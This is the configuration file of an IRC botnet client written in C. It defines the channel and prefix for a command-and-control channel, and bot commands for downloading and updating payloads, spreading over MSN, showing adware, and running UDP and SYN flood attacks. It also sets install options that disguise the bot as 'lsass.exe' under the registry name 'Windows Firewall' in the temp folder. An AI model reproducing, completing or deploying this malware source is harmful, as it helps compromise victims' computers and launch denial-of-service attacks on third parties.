#include "externs.h"

//mutex
char cfg_mutex[] = "jitjtrjhjg";

unsigned long cfg_reconnectsleep = 5000; // msec
unsigned long cfg_ircmaxwaittime = 600; // sec

char cfg_host[] = "";
char cfg_hostname[] = "ip"; 
unsigned short cfg_port = 6667;
char cfg_srvpass[] = ""; 
char cfg_channel[] = "#channel";  //channel to join
char cfg_chanpass[] = "";  //password to the channel
char cfg_p[] = "!";       //prefix
char ChanSafe[] = "#chansafe";

//commands
char cmd_ver[] = "v";
char cmd_join[] = "j";
char cmd_part[] = "p";
char cmd_download[] = "dl";
char cmd_clean[] = "clean";
char cmd_update[] = "update"; 
char cmd_uninstall[] = "removeo";
char cmd_msn[] = "msn";
char cmd_sort[] = "sort"; //Sort for 60 seconds..
char cmd_unsort[] = "unsort"; //Sort stop
char cmd_protect[] = "prot"; //Join protect channel for 5 minutes.
char cmd_protectleave[] = "protleave"; //leave protection room.
char cmd_popup[] = "adware";
char cmd_torrent[] = "torrent";
char cmd_udp[] = "udp";
char cmd_ssyn[] = "ssyn";


//installation stuff
char szRegname[] 	= "Windows Firewall";
char gotopth[]		= "%temp%";
char exename[]		= "lsass.exe";
char installrand[]	=	"114";//CHANGE THIS WITH EVERY NEW BIN -- JynX`



char versionInfo[] = "1.2";
